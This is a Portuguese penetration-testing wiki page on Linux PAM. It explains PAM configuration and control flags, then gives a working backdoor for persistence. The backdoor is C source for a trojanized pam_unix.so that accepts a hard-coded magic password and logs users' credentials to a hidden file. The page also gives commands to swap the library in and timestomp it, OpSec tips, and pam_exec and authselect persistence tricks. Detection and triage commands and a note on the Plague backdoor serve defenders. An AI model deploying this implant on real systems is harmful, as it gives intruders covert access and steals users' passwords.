# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Informações básicas

**PAM (Pluggable Authentication Modules)** atua como um mecanismo de segurança que **verifica a identidade dos usuários que tentam acessar serviços de computador**, controlando o acesso deles com base em vários critérios. É semelhante a um guardião digital, garantindo que apenas usuários autorizados possam utilizar serviços específicos e, potencialmente, limitando seu uso para evitar sobrecargas do sistema.

#### Arquivos de configuração

- **Sistemas baseados em Solaris e UNIX** normalmente utilizam um arquivo de configuração central localizado em `/etc/pam.conf`.
- **Sistemas Linux** preferem uma abordagem baseada em diretório, armazenando configurações específicas de cada serviço em `/etc/pam.d`. Por exemplo, o arquivo de configuração do serviço de login está localizado em `/etc/pam.d/login`.

Um exemplo de configuração do PAM para o serviço de login poderia ser assim:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **Domínios de gerenciamento do PAM**

Esses domínios, ou grupos de gerenciamento, incluem **auth**, **account**, **password** e **session**, cada um responsável por diferentes aspectos do processo de autenticação e gerenciamento de sessões:

- **Auth**: Valida a identidade do usuário, geralmente solicitando uma senha.
- **Account**: Lida com a verificação da conta, conferindo condições como associação a grupos ou restrições de horário.
- **Password**: Gerencia atualizações de senha, incluindo verificações de complexidade ou prevenção contra dictionary attacks.
- **Session**: Gerencia ações durante o início ou o encerramento de uma sessão de serviço, como montar diretórios ou definir limites de recursos.

#### **Controles dos módulos PAM**

Os controles determinam a resposta do módulo ao sucesso ou à falha, influenciando o processo geral de autenticação. Eles incluem:

- **Required**: A falha de um módulo required resulta em uma falha eventual, mas somente depois que todos os módulos subsequentes forem verificados.
- **Requisite**: Encerra imediatamente o processo em caso de falha.
- **Sufficient**: O sucesso ignora o restante das verificações do mesmo domínio, exceto se um módulo subsequente falhar.
- **Optional**: Só causa uma falha se for o único módulo na stack.

#### Semântica ofensiva importante

Ao criar um backdoor no PAM, a **localização da regra inserida** geralmente é mais importante que o próprio payload:

- `include` e `substack` carregam regras de outros arquivos, portanto editar `sshd` pode afetar apenas o SSH, enquanto editar `system-auth`, `common-auth` ou outra stack compartilhada afeta vários serviços simultaneamente.
- O PAM também oferece suporte a controles entre colchetes, como `[success=1 default=ignore]`. Eles podem ser abusados para **ignorar um ou mais módulos** após uma verificação customizada bem-sucedida, em vez de substituir visivelmente o `pam_unix.so`.
- O `module-path` pode ser **absoluto** (`/usr/lib/security/pam_custom.so`) ou **relativo** ao diretório padrão dos módulos PAM. Em sistemas Linux modernos, os diretórios reais geralmente são `/lib/security`, `/lib64/security`, `/usr/lib/security` ou caminhos multiarch como `/usr/lib/x86_64-linux-gnu/security`.

Conclusão rápida para o operador: sempre mapeie o **grafo completo de serviços** antes de aplicar alterações. Por exemplo, `sshd -> password-auth -> system-auth` em algumas distros ou `sshd -> system-remote-login -> system-login -> system-auth` em outras significa que o mesmo implante de uma linha pode se propagar muito mais do que o pretendido.

#### Exemplo de cenário

Em uma configuração com vários módulos de auth, o processo segue uma ordem estrita. Se o módulo `pam_securetty` considerar o terminal de login não autorizado, os logins de root serão bloqueados, mas todos os módulos ainda serão processados devido ao status "required". O `pam_env` define variáveis de ambiente, potencialmente contribuindo para a experiência do usuário. Os módulos `pam_ldap` e `pam_unix` trabalham juntos para autenticar o usuário, com o `pam_unix` tentando usar uma senha fornecida anteriormente, aumentando a eficiência e a flexibilidade dos métodos de autenticação.


## Criando um backdoor no PAM – Hooking `pam_unix.so`

Um truque clássico de persistência em ambientes Linux de alto valor é **substituir a biblioteca PAM legítima por um drop-in trojanizado**. Como todo login via SSH / console acaba chamando `pam_unix.so:pam_sm_authenticate()`, algumas linhas de C são suficientes para capturar credenciais ou implementar um bypass de senha *magic*.

### Cheatsheet de compilação
<details>
<summary>Exemplo de trojan `pam_unix.so`</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Compile e substitua furtivamente:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Dicas de OpSec
1. **Sobrescrita atômica** – escreva em um arquivo temporário e use `mv` para colocá-lo no local correto, evitando bibliotecas parcialmente gravadas que bloqueariam o acesso via SSH.
2. A colocação de arquivos de log, como `/usr/bin/.dbus.log`, mistura-se com artefatos legítimos do desktop.
3. Mantenha as exportações de símbolos idênticas (`pam_sm_setcred`, etc.) para evitar mau funcionamento do PAM.

### Detecção
* Compare o MD5/SHA256 de `pam_unix.so` com o pacote da distro.
* `rpm -V pam` ou `debsums -s libpam-modules` para identificar bibliotecas substituídas sem hashing manual.
* Verifique se há permissões de escrita para todos ou ownership incomum em `/lib/security/`.
* Regra do `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Procure nos arquivos de configuração do PAM por módulos inesperados: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Comandos rápidos de triagem (após um comprometimento ou durante threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Abusando de `pam_exec` para persistência
Em vez de substituir `pam_unix.so`, uma abordagem menos invasiva é adicionar uma linha `pam_exec` a `/etc/pam.d/sshd` para que cada login SSH execute um implant, mantendo a stack normal intacta:
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` recebe metadados do PAM em variáveis de ambiente como `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` e `PAM_TYPE`. Com `expose_authtok`, o helper também pode ler a senha de `stdin` durante as fases `auth` ou `password`. Se quiser que o helper seja executado com o UID efetivo em vez do UID real, adicione `seteuid`.

Notas práticas:

- `session optional pam_exec.so ...` é melhor para **ações pós-login**, como reabrir sockets ou iniciar um daemon desanexado.
- `auth optional pam_exec.so quiet expose_authtok ...` é a escolha usual para **captura de credenciais**, pois é executado antes de a sessão ser aberta.
- `type=session` ou `type=auth` pode ser usado para restringir a execução a uma fase específica do PAM e evitar uma segunda execução ruidosa.

### Sobrevivendo às ferramentas da distro: `authselect`

No RHEL, CentOS Stream, Fedora e sistemas derivados, edições diretas em arquivos gerados, como `/etc/pam.d/system-auth` ou `/etc/pam.d/password-auth`, podem ser **sobrescritas pelo `authselect`**. Para persistência, os operadores geralmente alteram o perfil customizado ativo em `/etc/authselect/custom/<profile>/` e depois o selecionam novamente ou aplicam-no.

Fluxo de trabalho típico quando você tem root:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
Isso é importante tanto para a ofensiva quanto para a triagem: se `/etc/pam.d/system-auth` contiver o banner `Generated by authselect` e `Do not modify this file manually`, o verdadeiro ponto de persistência pode estar em `/etc/authselect/custom/`, e não em `/etc/pam.d/`.

### Tradecraft recente observado no mundo real

Relatórios recentes de 2025 sobre o backdoor Linux **Plague** mostraram a mesma ideia central levada além: um componente PAM malicioso com uma **static bypass password**, além da limpeza de variáveis de ambiente relacionadas ao SSH e do histórico do shell (`HISTFILE=/dev/null`) para reduzir os rastros da sessão após o login. Esse é um padrão de hunting útil, pois a lógica do backdoor pode estar no PAM, enquanto os artefatos de stealth só aparecem **após** a autenticação ser bem-sucedida.


## References

- [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [Nextron Systems - Plague: A Newly Discovered PAM-Based Backdoor for Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
